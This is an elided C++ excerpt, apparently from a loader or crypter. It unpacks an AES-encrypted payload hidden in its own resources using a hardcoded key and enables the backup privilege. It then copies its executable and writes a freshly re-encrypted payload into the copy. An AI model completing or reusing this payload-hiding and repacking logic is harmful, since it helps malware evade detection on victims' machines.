...
vector<BYTE> LoadEncryptedPayload() {
    ...
    BYTE* pEncryptedData = static_cast<BYTE*>(LockResource(hLoadedResource));
    if (pEncryptedData == NULL) {
        cerr << "[error] Failed to lock payload resource.\n";
        exit(EXIT_FAILURE);
    }

    return vector<BYTE>(pEncryptedData, pEncryptedData + payloadSize);
}
...
int main() {
    ...
    if (!SetPrivilege(hToken, SE_BACKUP_NAME, TRUE))
    {
        ...
        // Disable previously enabled privilege
    ...
    vector<BYTE> encryptedData = LoadEncryptedPayload();

    // Convert the hardcoded key to a byte vector
    vector<BYTE> aesKey = HexStringToBytes(hardcodedKeyHex);

    // Import the key
    hKey = ImportAESKey(hCryptProv, aesKey);

    // Decrypt and decompress the payload
    DecryptData(hKey, encryptedData);
    vector<BYTE> decompressedData = DecompressData(encryptedData);
    ...
    if (!GetModuleFileName(NULL, exePath, MAX_PATH)) {
        cerr << "[error] Failed to get module file name. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    // Create a copy of the executable
    string newExePath = string(exePath) + "_copy.exe";
    if (!CopyFile(exePath, newExePath.c_str(), FALSE)) {
        cerr << "[error] Failed to copy executable. Error: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    // Recompress, encrypt, and update the resource in the copied executable
    CompressEncryptWriteBack(hCryptProv, decompressedData, newExePath);
